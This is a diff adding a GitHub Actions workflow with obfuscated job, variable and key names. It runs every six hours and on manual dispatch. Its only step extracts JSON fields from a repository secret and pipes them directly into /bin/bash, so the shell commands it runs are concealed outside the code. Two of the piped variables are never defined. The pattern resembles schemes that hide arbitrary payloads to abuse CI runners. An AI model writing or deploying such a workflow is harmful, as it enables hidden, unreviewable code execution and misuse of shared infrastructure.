@@ -1,0 +1,20 @@
+name: zhuyoude3645
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuyoude3645
+        env:
+          t62790: ${{ secrets.t62790 }}
+        run: |
+          echo $t62790 | jq -r .zzomx66 | /bin/bash
+          echo $vmvw8676 | jq -r .ioqu0 | /bin/bash
+          echo $csk78453 | jq -r .wve3417 | /bin/bash
+
